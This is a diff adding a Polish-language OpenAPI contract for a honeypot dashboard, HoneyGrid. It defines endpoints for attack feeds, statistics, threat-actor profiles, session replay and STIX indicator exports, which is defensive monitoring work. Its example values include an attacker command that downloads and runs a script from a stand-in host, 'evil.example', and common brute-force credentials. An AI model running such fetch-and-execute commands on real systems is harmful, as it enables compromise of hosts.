@@ -1,0 +1,903 @@
+openapi: 3.1.0
+info:
+  title: HoneyGrid Dashboard API
+  version: 1.0.0
+  summary: Kontrakt API dla dashboardu HoneyGrid
+  description: |
+    Wspólny kontrakt API pomiędzy backendem (Track A — Detekcja i Reagowanie)
+    a frontendem (Track B — Wywiad i Doświadczenie Użytkownika).
+
+    **Ten plik jest źródłem prawdy.** Obie ścieżki kodują wyłącznie względem
+    tego kontraktu: backend implementuje endpointy, frontend generuje mocki MSW
+    na podstawie schematów poniżej.
+
+    ## Czas rzeczywisty — SignalR (zobacz rozszerzenie `x-signalr`)
+    Oprócz REST API serwer udostępnia hub SignalR pod ścieżką `/hubs/attacks`.
+    Zdarzenie serwer→klient o nazwie `attack` niesie pojedynczy obiekt
+    `HoneypotEvent` (schemat identyczny jak w `components.schemas.HoneypotEvent`).
+    Frontend subskrybuje hub, aby aktualizować mapę ataków i kanał zdarzeń
+    na żywo, bez odpytywania REST.
+  contact:
+    name: Zespół HoneyGrid
+  license:
+    name: MIT
+    identifier: MIT
+
+x-signalr:
+  hubs:
+    - path: /hubs/attacks
+      description: >-
+        Hub SignalR rozgłaszający zdarzenia honeypot w czasie rzeczywistym
+        (zasilany z Cosmos DB Change Feed przez Azure Functions).
+      events:
+        - name: attack
+          direction: server-to-client
+          description: >-
+            Pojedyncze, wzbogacone zdarzenie honeypot. Ładunek jest zgodny
+            ze schematem HoneypotEvent z tego kontraktu (camelCase JSON).
+          payload:
+            $ref: '#/components/schemas/HoneypotEvent'
+
+servers:
+  - url: https://honeygrid-api.azurewebsites.net
+    description: Środowisko deweloperskie (Azure)
+  - url: http://127.0.0.1:7071
+    description: Lokalny host Azure Functions (dev)
+
+security:
+  - functionsKey: []
+
+tags:
+  - name: feed
+    description: Kanał zdarzeń honeypot
+  - name: stats
+    description: Statystyki i agregacje
+  - name: actors
+    description: Profilowanie aktorów zagrożeń
+  - name: sessions
+    description: Odtwarzanie sesji atakujących
+  - name: iocs
+    description: Wskaźniki kompromitacji (STIX 2.1)
+
+paths:
+  /api/feed:
+    get:
+      operationId: getFeed
+      tags: [feed]
+      summary: Pobierz kanał zdarzeń honeypot
+      description: |
+        Zwraca zdarzenia honeypot posortowane rosnąco po znaczniku czasu.
+        Stronicowanie kontynuacyjne: klient podaje w parametrze `since`
+        znacznik czasu (`timestamp`) ostatniego otrzymanego zdarzenia,
+        aby pobrać kolejną stronę. Brak `since` oznacza najstarsze dostępne
+        zdarzenia w oknie retencji.
+      parameters:
+        - name: since
+          in: query
+          required: false
+          description: >-
+            Zwracaj wyłącznie zdarzenia ze znacznikiem czasu ściśle późniejszym
+            niż podana data (ISO 8601). Służy jako token kontynuacji przy
+            stronicowaniu.
+          schema:
+            type: string
+            format: date-time
+          example: '2026-06-10T12:00:00Z'
+        - name: take
+          in: query
+          required: false
+          description: Maksymalna liczba zwracanych zdarzeń (domyślnie 100, maksymalnie 500).
+          schema:
+            type: integer
+            default: 100
+            minimum: 1
+            maximum: 500
+      responses:
+        '401':
+          $ref: '#/components/responses/Unauthorized'
+        '200':
+          description: >-
+            Tablica zdarzeń honeypot. Pusta tablica oznacza brak nowszych
+            zdarzeń — klient może ponowić zapytanie z tym samym `since`.
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  $ref: '#/components/schemas/HoneypotEvent'
+        '400':
+          $ref: '#/components/responses/BadRequest'
+
+  /api/stats/overview:
+    get:
+      operationId: getStatsOverview
+      tags: [stats]
+      summary: Pobierz statystyki ogólne
+      description: >-
+        Zwraca podsumowanie aktywności: liczniki dzienne oraz szereg czasowy
+        zdarzeń na minutę (ostatnie 60 minut) do wykresu na dashboardzie.
+      responses:
+        '401':
+          $ref: '#/components/responses/Unauthorized'
+        '200':
+          description: Statystyki ogólne dashboardu.
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/StatsOverview'
+
+  /api/stats/geo:
+    get:
+      operationId: getStatsGeo
+      tags: [stats]
+      summary: Pobierz agregacje geograficzne
+      description: >-
+        Zwraca zagregowane wiadra geograficzne (per kraj) do mapy ataków.
+        Posortowane malejąco po liczbie zdarzeń.
+      responses:
+        '401':
+          $ref: '#/components/responses/Unauthorized'
+        '200':
+          description: Tablica wiader geograficznych.
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  $ref: '#/components/schemas/GeoBucket'
+
+  /api/stats/credentials:
+    get:
+      operationId: getStatsCredentials
+      tags: [stats]
+      summary: Pobierz analizę poświadczeń
+      description: >-
+        Zwraca najczęściej używane nazwy użytkowników, hasła oraz pary
+        login/hasło z prób logowania do honeypotów.
+      responses:
+        '401':
+          $ref: '#/components/responses/Unauthorized'
+        '200':
+          description: Statystyki poświadczeń.
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/CredentialStats'
+
+  /api/actors:
+    get:
+      operationId: listActors
+      tags: [actors]
+      summary: Pobierz listę aktorów zagrożeń
+      description: >-
+        Zwraca listę sprofilowanych aktorów zagrożeń (skorelowane klastry
+        aktywności), posortowaną malejąco po `lastSeen`. Pole `dossier`
+        może być pominięte w widoku listy.
+      responses:
+        '401':
+          $ref: '#/components/responses/Unauthorized'
+        '200':
+          description: Lista aktorów zagrożeń.
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  $ref: '#/components/schemas/ThreatActor'
+
+  /api/actors/{id}:
+    get:
+      operationId: getActor
+      tags: [actors]
+      summary: Pobierz pełny dossier aktora
+      description: >-
+        Zwraca pełny profil aktora zagrożeń, w tym dossier wygenerowane
+        przez AI oraz odcisk behawioralny (fingerprint).
+      parameters:
+        - name: id
+          in: path
+          required: true
+          description: Identyfikator aktora zagrożeń.
+          schema:
+            type: string
+          example: actor-7f3a
+      responses:
+        '401':
+          $ref: '#/components/responses/Unauthorized'
+        '200':
+          description: Pełny dossier aktora.
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/ThreatActor'
+        '404':
+          $ref: '#/components/responses/NotFound'
+
+  /api/sessions/{id}/replay:
+    get:
+      operationId: getSessionReplay
+      tags: [sessions]
+      summary: Pobierz nagranie sesji do odtworzenia
+      description: |
+        Zwraca ładunek odtwarzania sesji atakującego w formacie zbliżonym do
+        asciicast: metadane sesji oraz listę klatek czasowych. Każda klatka
+        to para `[delaySeconds, data]` — opóźnienie względem poprzedniej
+        klatki (sekundy, liczba zmiennoprzecinkowa) i dane wyjściowe
+        terminala (tekst, może zawierać sekwencje ANSI).
+      parameters:
+        - name: id
+          in: path
+          required: true
+          description: Identyfikator sesji (`sessionId` ze zdarzeń).
+          schema:
+            type: string
+          example: a1b2c3d4e5f6
+      responses:
+        '401':
+          $ref: '#/components/responses/Unauthorized'
+        '200':
+          description: Ładunek odtwarzania sesji.
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/SessionReplay'
+        '404':
+          $ref: '#/components/responses/NotFound'
+
+  /api/iocs/stix:
+    get:
+      operationId: getStixBundle
+      tags: [iocs]
+      summary: Pobierz paczkę STIX 2.1 z IoC
+      description: |
+        Zwraca paczkę (bundle) STIX 2.1 zawierającą wskaźniki kompromitacji
+        wygenerowane z telemetrii honeypotów: obiekt `identity` (HoneyGrid
+        jako producent), obiekty `indicator` (złośliwe IP, hashe plików),
+        obiekty `attack-pattern` (mapowanie MITRE ATT&CK) oraz obiekty
+        `relationship` łączące wskaźniki z wzorcami ataku.
+        Format zgodny z konsumentami TAXII/Sentinel.
+      responses:
+        '401':
+          $ref: '#/components/responses/Unauthorized'
+        '200':
+          description: Paczka STIX 2.1.
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/StixBundle'
+
+components:
+  securitySchemes:
+    functionsKey:
+      type: apiKey
+      in: header
+      name: x-functions-key
+      description: >-
+        Klucz funkcji Azure Functions. W środowisku lokalnym (Azurite +
+        `func start`) klucz nie jest wymagany; w Azure przekazywany w nagłówku
+        `x-functions-key` lub parametrze zapytania `code`.
+
+  responses:
+    Unauthorized:
+      description: Brak lub nieprawidłowy klucz funkcji.
+      content:
+        application/json:
+          schema:
+            $ref: '#/components/schemas/ProblemDetails'
+    BadRequest:
+      description: Nieprawidłowe parametry zapytania.
+      content:
+        application/json:
+          schema:
+            $ref: '#/components/schemas/ProblemDetails'
+    NotFound:
+      description: Zasób o podanym identyfikatorze nie istnieje.
+      content:
+        application/json:
+          schema:
+            $ref: '#/components/schemas/ProblemDetails'
+
+  schemas:
+    ProblemDetails:
+      type: object
+      description: Standardowy obiekt błędu (RFC 9457 — Problem Details).
+      properties:
+        type:
+          type: string
+          description: URI identyfikujący typ problemu.
+        title:
+          type: string
+          description: Krótki, czytelny opis problemu.
+        status:
+          type: integer
+          description: Kod statusu HTTP.
+        detail:
+          type: string
+          description: Szczegółowe wyjaśnienie wystąpienia problemu.
+      example:
+        type: about:blank
+        title: Bad Request
+        status: 400
+        detail: Parametr 'take' nie może przekraczać 500.
+
+    HoneypotEvent:
+      type: object
+      description: >-
+        Pojedyncze, wzbogacone zdarzenie z sensora honeypot. To jest WSPÓLNY
+        schemat zdarzenia używany przez oba tracki (camelCase). Zmiany tylko
+        za obopólną zgodą.
+      required: [id, attackerIp, sensorId, sensorType, timestamp, eventType]
+      properties:
+        id:
+          type: string
+          format: uuid
+          description: Unikalny identyfikator zdarzenia (UUID).
+        attackerIp:
+          type: string
+          description: Adres IP atakującego (IPv4 lub IPv6).
+          example: 185.220.101.42
+        sensorId:
+          type: string
+          description: Identyfikator sensora, który zarejestrował zdarzenie.
+          example: sensor-weu-ssh-01
+        sensorType:
+          type: string
+          description: Typ sensora honeypot.
+          enum: [ssh, web, rdp]
+        timestamp:
+          type: string
+          format: date-time
+          description: Znacznik czasu zdarzenia (UTC, ISO 8601).
+        eventType:
+          type: string
+          description: Rodzaj zdarzenia zarejestrowanego przez sensor.
+          enum: [login.failed, login.success, command, http.request, connect]
+        sessionId:
+          type: string
+          description: >-
+            Identyfikator sesji atakującego (opcjonalny; grupuje zdarzenia
+            z jednego połączenia, używany do odtwarzania sesji).
+          example: a1b2c3d4e5f6
+        geo:
+          $ref: '#/components/schemas/GeoInfo'
+        credentials:
+          $ref: '#/components/schemas/CredentialAttempt'
+        command:
+          type: string
+          description: Polecenie wpisane przez atakującego (dla eventType=command).
+          example: wget http://evil.example/x.sh; chmod +x x.sh; ./x.sh
+        downloadHash:
+          type: string
+          description: Skrót SHA-256 pliku pobranego przez atakującego.
+          example: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+        http:
+          $ref: '#/components/schemas/HttpInfo'
+        threatIntel:
+          $ref: '#/components/schemas/ThreatIntel'
+        classification:
+          $ref: '#/components/schemas/Classification'
+        ttyRef:
+          type: string
+          description: >-
+            Referencja (ścieżka blob) do nagrania TTY sesji — podstawa
+            funkcji odtwarzania sesji.
+          example: ttylogs/a1b2c3d4e5f6.tty
+        rawRef:
+          type: string
+          description: Referencja (ścieżka blob) do surowego logu źródłowego.
+          example: raw/2026/06/10/sensor-weu-ssh-01/a1b2c3d4e5f6.json
+
+    GeoInfo:
+      type: object
+      description: Wzbogacenie geolokalizacyjne adresu IP atakującego.
+      properties:
+        country:
+          type: string
+          description: Dwuliterowy kod kraju (ISO 3166-1 alpha-2).
+          example: RU
+        countryName:
+          type: string
+          description: Pełna nazwa kraju.
+          example: Rosja
+        city:
+          type: string
+          description: Miasto (jeśli dostępne).
+          example: Moskwa
+        lat:
+          type: number
+          description: Szerokość geograficzna.
+          example: 55.7558
+        lon:
+          type: number
+          description: Długość geograficzna.
+          example: 37.6173
+        asn:
+          type: integer
+          description: Numer systemu autonomicznego (ASN).
+          example: 12389
+        org:
+          type: string
+          description: Nazwa organizacji / operatora sieci.
+          example: PJSC Rostelecom
+
+    CredentialAttempt:
+      type: object
+      description: Poświadczenia użyte w próbie logowania.
+      properties:
+        username:
+          type: string
+          description: Nazwa użytkownika użyta przez atakującego.
+          example: root
+        password:
+          type: string
+          description: Hasło użyte przez atakującego.
+          example: '123456'
+
+    HttpInfo:
+      type: object
+      description: Szczegóły żądania HTTP (dla sensorów web).
+      properties:
+        method:
+          type: string
+          description: Metoda HTTP.
+          example: GET
+        path:
+          type: string
+          description: Ścieżka żądania.
+          example: /wp-login.php
+        userAgent:
+          type: string
+          description: Nagłówek User-Agent klienta.
+          example: Mozilla/5.0 zgrab/0.x
+
+    ThreatIntel:
+      type: object
+      description: Wzbogacenie o zewnętrzne źródła threat intelligence.
+      properties:
+        knownMalicious:
+          type: boolean
+          description: Czy adres IP figuruje na listach złośliwych adresów.
+        sources:
+          type: array
+          description: Źródła, które potwierdzają złośliwość (np. AbuseIPDB, Spamhaus).
+          items:
+            type: string
+          example: [AbuseIPDB, Spamhaus]
+        score:
+          type: number
+          description: Zagregowany wskaźnik pewności złośliwości (0–100).
+          example: 97
+
+    Classification:
+      type: object
+      description: >-
+        Wynik klasyfikacji AI zdarzenia (generowany asynchronicznie przez
+        klasyfikator; do czasu jego ukończenia Track B pracuje na
+        stub-klasyfikatorze zwracającym ten sam kształt danych).
+      properties:
+        killChainPhase:
+          type: string
+          description: Faza modelu Cyber Kill Chain przypisana zdarzeniu.
+          enum: [recon, weaponization, delivery, exploitation, installation, c2, actions]
+        category:
+          type: string
+          description: Kategoria ataku (np. brute-force, dostarczenie malware, web-scan).
+          example: brute-force
+        sophistication:
+          type: number
+          minimum: 0
+          maximum: 1
+          description: Ocena zaawansowania atakującego (0 — bot/skrypt, 1 — zaawansowany operator).
+          example: 0.2
+        intent:
+          type: string
+          description: Wnioskowany cel atakującego.
+          example: budowa botnetu DDoS
+        actorId:
+          type: string
+          description: Identyfikator aktora zagrożeń, do którego przypisano zdarzenie.
+          example: actor-7f3a
+
+    StatsOverview:
+      type: object
+      description: Podsumowanie aktywności do nagłówka dashboardu.
+      required: [eventsToday, uniqueIps, activeSensors, eventsPerMinute]
+      properties:
+        eventsToday:
+          type: integer
+          description: Liczba zdarzeń zarejestrowanych dzisiaj (UTC).
+          example: 14823
+        uniqueIps:
+          type: integer
+          description: Liczba unikalnych adresów IP atakujących dzisiaj.
+          example: 1204
+        activeSensors:
+          type: integer
+          description: Liczba sensorów aktywnych w ciągu ostatnich 5 minut.
+          example: 6
+        topCountry:
+          type: string
+          description: Kod kraju z największą liczbą zdarzeń dzisiaj (ISO 3166-1 alpha-2).
+          example: CN
+        eventsPerMinute:
+          type: array
+          description: Szereg czasowy liczby zdarzeń na minutę (ostatnie 60 minut).
+          items:
+            $ref: '#/components/schemas/TimeSeriesPoint'
+
+    TimeSeriesPoint:
+      type: object
+      description: Punkt szeregu czasowego.
+      required: [timestamp, count]
+      properties:
+        timestamp:
+          type: string
+          format: date-time
+          description: Początek minuty (UTC).
+        count:
+          type: integer
+          description: Liczba zdarzeń w danej minucie.
+          example: 42
+
+    GeoBucket:
+      type: object
+      description: Zagregowane wiadro geograficzne (per kraj) do mapy ataków.
+      required: [country, countryName, lat, lon, count]
+      properties:
+        country:
+          type: string
+          description: Dwuliterowy kod kraju (ISO 3166-1 alpha-2).
+          example: CN
+        countryName:
+          type: string
+          description: Pełna nazwa kraju.
+          example: Chiny
+        lat:
+          type: number
+          description: Szerokość geograficzna centroidu kraju.
+          example: 35.8617
+        lon:
+          type: number
+          description: Długość geograficzna centroidu kraju.
+          example: 104.1954
+        count:
+          type: integer
+          description: Liczba zdarzeń z danego kraju w bieżącym oknie agregacji.
+          example: 5371
+
+    CredentialStats:
+      type: object
+      description: Analiza najczęściej używanych poświadczeń.
+      required: [topUsernames, topPasswords, topPairs]
+      properties:
+        topUsernames:
+          type: array
+          description: Najczęstsze nazwy użytkowników (malejąco po liczbie wystąpień).
+          items:
+            $ref: '#/components/schemas/CountedValue'
+        topPasswords:
+          type: array
+          description: Najczęstsze hasła (malejąco po liczbie wystąpień).
+          items:
+            $ref: '#/components/schemas/CountedValue'
+        topPairs:
+          type: array
+          description: Najczęstsze pary login/hasło (malejąco po liczbie wystąpień).
+          items:
+            $ref: '#/components/schemas/CountedPair'
+
+    CountedValue:
+      type: object
+      description: Wartość wraz z liczbą wystąpień.
+      required: [value, count]
+      properties:
+        value:
+          type: string
+          description: Wartość (nazwa użytkownika lub hasło).
+          example: root
+        count:
+          type: integer
+          description: Liczba wystąpień.
+          example: 3812
+
+    CountedPair:
+      type: object
+      description: Para login/hasło wraz z liczbą wystąpień.
+      required: [username, password, count]
+      properties:
+        username:
+          type: string
+          description: Nazwa użytkownika.
+          example: admin
+        password:
+          type: string
+          description: Hasło.
+          example: admin
+        count:
+          type: integer
+          description: Liczba wystąpień pary.
+          example: 951
+
+    ThreatActor:
+      type: object
+      description: >-
+        Sprofilowany aktor zagrożeń — klaster skorelowanej aktywności
+        (po IP/ASN, odcisku behawioralnym, poświadczeniach i czasie).
+      required: [id, name, eventCount, firstSeen, lastSeen, countries, asns, sophistication]
+      properties:
+        id:
+          type: string
+          description: Identyfikator aktora.
+          example: actor-7f3a
+        name:
+          type: string
+          description: Nadana nazwa aktora (generowana, czytelna dla człowieka).
+          example: Miedziany Skorpion
+        eventCount:
+          type: integer
+          description: Łączna liczba zdarzeń przypisanych aktorowi.
+          example: 2417
+        firstSeen:
+          type: string
+          format: date-time
+          description: Znacznik czasu pierwszej zaobserwowanej aktywności.
+        lastSeen:
+          type: string
+          format: date-time
+          description: Znacznik czasu ostatniej zaobserwowanej aktywności.
+        countries:
+          type: array
+          description: Kody krajów, z których obserwowano aktywność.
+          items:
+            type: string
+          example: [RU, NL]
+        asns:
+          type: array
+          description: Numery ASN powiązane z infrastrukturą aktora.
+          items:
+            type: integer
+          example: [12389, 60729]
+        sophistication:
+          type: number
+          minimum: 0
+          maximum: 1
+          description: Średnia ocena zaawansowania (0–1).
+          example: 0.65
+        dossier:
+          $ref: '#/components/schemas/ActorDossier'
+        fingerprint:
+          $ref: '#/components/schemas/ActorFingerprint'
+
+    ActorDossier:
+      type: object
+      description: Dossier aktora wygenerowane przez AI (Azure OpenAI).
+      properties:
+        summary:
+          type: string
+          description: Narracyjne podsumowanie działalności aktora.
+          example: >-
+            Aktor prowadzi zautomatyzowane kampanie brute-force SSH z
+            infrastruktury w RU/NL, po uzyskaniu dostępu pobiera koparkę
+            kryptowalut i utrwala obecność przez cron.
+        archetype:
+          type: string
+          description: Archetyp aktora (np. botnet-operator, cryptominer, script-kiddie, APT-like).
+          example: cryptominer
+        goals:
+          type: string
+          description: Wnioskowane cele działania.
+          example: monetyzacja przejętych hostów przez wydobycie kryptowalut
+        killChain:
+          type: array
+          description: Fazy kill chain zaobserwowane u aktora.
+          items:
+            type: string
+            enum: [recon, weaponization, delivery, exploitation, installation, c2, actions]
+          example: [recon, exploitation, installation]
+        threatLevel:
+          type: string
+          description: Poziom zagrożenia (low / medium / high / critical).
+          example: medium
+
+    ActorFingerprint:
+      type: object
+      description: Odcisk behawioralny aktora używany do korelacji aktywności.
+      properties:
+        commands:
+          type: array
+          description: Charakterystyczne polecenia wykonywane po uzyskaniu dostępu.
+          items:
+            type: string
+          example: ['uname -a', 'cat /proc/cpuinfo', 'wget http://evil.example/x.sh']
+        credentials:
+          type: array
+          description: Charakterystyczne pary login/hasło (format "login:hasło").
+          items:
+            type: string
+          example: ['root:123456', 'admin:admin']
+        timing:
+          type: string
+          description: Wzorzec czasowy aktywności (np. okna godzinowe, interwały).
+          example: aktywność 02:00–06:00 UTC, interwał prób ~1,2 s (automat)
+
+    SessionReplay:
+      type: object
+      description: >-
+        Ładunek odtwarzania sesji atakującego w formacie zbliżonym do
+        asciicast v2 — metadane plus klatki czasowe.
+      required: [meta, frames]
+      properties:
+        meta:
+          $ref: '#/components/schemas/SessionReplayMeta'
+        frames:
+          type: array
+          description: |
+            Klatki czasowe nagrania. Każda klatka to dwuelementowa tablica
+            `[delaySeconds, data]`:
+            - `delaySeconds` (number) — opóźnienie w sekundach względem poprzedniej klatki,
+            - `data` (string) — dane wyjściowe terminala (mogą zawierać sekwencje ANSI).
+          items:
+            $ref: '#/components/schemas/ReplayFrame'
+
+    SessionReplayMeta:
+      type: object
+      description: Metadane nagrania sesji.
+      required: [sessionId, attackerIp, startedAt, durationSeconds]
+      properties:
+        sessionId:
+          type: string
+          description: Identyfikator sesji.
+          example: a1b2c3d4e5f6
+        attackerIp:
+          type: string
+          description: Adres IP atakującego.
+          example: 185.220.101.42
+        sensorId:
+          type: string
+          description: Identyfikator sensora.
+          example: sensor-weu-ssh-01
+        startedAt:
+          type: string
+          format: date-time
+          description: Znacznik czasu rozpoczęcia sesji.
+        durationSeconds:
+          type: number
+          description: Łączny czas trwania sesji w sekundach.
+          example: 187.4
+        width:
+          type: integer
+          description: Szerokość terminala (kolumny).
+          default: 80
+        height:
+          type: integer
+          description: Wysokość terminala (wiersze).
+          default: 24
+
+    ReplayFrame:
+      type: array
+      description: 'Klatka nagrania: para [delaySeconds, data].'
+      prefixItems:
+        - type: number
+          description: Opóźnienie w sekundach względem poprzedniej klatki.
+        - type: string
+          description: Dane wyjściowe terminala.
+      minItems: 2
+      maxItems: 2
+      items: false
+      example: [0.42, 'root@svr04:~# ']
+
+    StixBundle:
+      type: object
+      description: Paczka STIX 2.1 (https://docs.oasis-open.org/cti/stix/v2.1/).
+      required: [type, id, objects]
+      properties:
+        type:
+          type: string
+          const: bundle
+          description: Typ obiektu STIX — zawsze `bundle`.
+        id:
+          type: string
+          description: Identyfikator paczki w formacie `bundle--<uuid>`.
+          pattern: '^bundle--[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$'
+          example: bundle--c9d3f0a1-2b4e-4c8d-9f0a-1b2c3d4e5f60
+        objects:
+          type: array
+          description: >-
+            Obiekty STIX: identity (producent HoneyGrid), indicator (IoC),
+            attack-pattern (MITRE ATT&CK), relationship (powiązania).
+          items:
+            $ref: '#/components/schemas/StixObject'
+
+    StixObject:
+      type: object
+      description: >-
+        Obiekt domeny STIX 2.1. Wymagane pola wspólne; pozostałe pola zależą
+        od typu obiektu (np. `pattern` dla indicator, `relationship_type`,
+        `source_ref`, `target_ref` dla relationship). Nazwy pól w snake_case
+        zgodnie ze specyfikacją STIX (wyjątek od konwencji camelCase API).
+      required: [type, spec_version, id, created, modified]
+      properties:
+        type:
+          type: string
+          description: Typ obiektu STIX.
+          enum: [identity, indicator, attack-pattern, relationship]
+        spec_version:
+          type: string
+          const: '2.1'
+          description: Wersja specyfikacji STIX.
+        id:
+          type: string
+          description: Identyfikator w formacie `<typ>--<uuid>`.
+          example: indicator--44af6c39-c09b-49c5-9de2-394224f04982
+        created:
+          type: string
+          format: date-time
+          description: Data utworzenia obiektu.
+        modified:
+          type: string
+          format: date-time
+          description: Data ostatniej modyfikacji obiektu.
+        name:
+          type: string
+          description: Nazwa obiektu (identity, indicator, attack-pattern).
+          example: Złośliwy adres IP — brute-force SSH
+        description:
+          type: string
+          description: Opis obiektu.
+        pattern:
+          type: string
+          description: Wzorzec STIX (tylko dla indicator).
+          example: "[ipv4-addr:value = '185.220.101.42']"
+        pattern_type:
+          type: string
+          description: Typ wzorca (tylko dla indicator), zwykle `stix`.
+          example: stix
+        valid_from:
+          type: string
+          format: date-time
+          description: Początek okresu ważności wskaźnika (tylko dla indicator).
+        labels:
+          type: array
+          description: Etykiety obiektu (np. malicious-activity).
+          items:
+            type: string
+          example: [malicious-activity]
+        identity_class:
+          type: string
+          description: Klasa tożsamości (tylko dla identity), np. `system`.
+          example: system
+        relationship_type:
+          type: string
+          description: Typ relacji (tylko dla relationship), np. `indicates`.
+          example: indicates
+        source_ref:
+          type: string
+          description: Identyfikator obiektu źródłowego relacji (tylko dla relationship).
+          example: indicator--44af6c39-c09b-49c5-9de2-394224f04982
+        target_ref:
+          type: string
+          description: Identyfikator obiektu docelowego relacji (tylko dla relationship).
+          example: attack-pattern--3f1b2a4c-5d6e-4f70-8a9b-0c1d2e3f4a5b
+        created_by_ref:
+          type: string
+          description: Referencja do obiektu identity producenta.
+          example: identity--0a1b2c3d-4e5f-4a6b-8c9d-0e1f2a3b4c5d
+        external_references:
+          type: array
+          description: Referencje zewnętrzne (np. do MITRE ATT&CK).
+          items:
+            type: object
+            properties:
+              source_name:
+                type: string
+                description: Nazwa źródła referencji.
+                example: mitre-attack
+              external_id:
+                type: string
+                description: Identyfikator zewnętrzny (np. technika ATT&CK).
+                example: T1110
+              url:
+                type: string
+                description: Adres URL referencji.
+                example: https://attack.mitre.org/techniques/T1110/
+      additionalProperties: true
